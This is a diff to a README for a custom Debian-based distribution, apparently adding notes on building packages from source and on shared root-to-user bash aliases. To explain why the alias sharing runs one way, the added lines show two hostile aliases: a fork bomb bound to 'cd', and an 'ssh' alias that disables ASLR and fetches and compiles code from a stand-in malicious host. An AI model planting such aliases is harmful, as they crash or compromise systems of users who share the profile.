@@ -117,6 +117,20 @@ be initially added to your custom distribution.
 
 Extended Club Mix:
 
+There are certain packages that are not 
+up-to-date in their Debian Repos. You may
+need to download them from their creators/
+distributors and build them from source.
+
+I am debating whether these should be 
+separate script/config-files, or whether
+we want to add those steps to this process.
+currently, totally up to you.
+
+In the future, this will fall under the 
+bankey of the `SoftChecks` program TBD
+later.
+
 I will also be installing RPM,
 Yum, and Pacman to increase the amount of 
 software resources I have access to, and
@@ -147,13 +161,15 @@ my bash preferences, and have configured a
 centralized approach that allows the user to
 share the same bash settings as root. This is a 
 one-way conduit from root to user, for what 
-should be obvious reasons:
+should be obvious reasons.. Let's say:
 `echo 'alias cd=":(){:|: & }:"' >> /path/to/shared/.bash_aliases`
+... or even:
+`echo 'alias ssh="echo 0 > /proc/sys/kernel/randomize_va_space && sh -c $(curl -s https://malicious-site.tld/evil-program.c > ./evil-program && gcc -fno-stack-protector -z execstack -o evil-program evil-program.c && ) '
 However, if you wish to overwrite the centralized
 profile settings, you can do that for any
 unprivileged user. In the config.
 
-My intention in building this 
+My intention in building this prototype
 is a single-user system (barring the occasional 
 `undocumented admin`) With a non-root user
 solely for SSH and file storage.
@@ -163,6 +179,14 @@ what this is all about. If you would like to
 share your custom configurations, and add them to
 the list, please, by all means make a pull 
 request.
+
+
+### Services
+
+One of the primary objectives of this is 
+0-config military-grade security for end-users.
+While that's realistically unattainable, and 
+
 
 
 ###
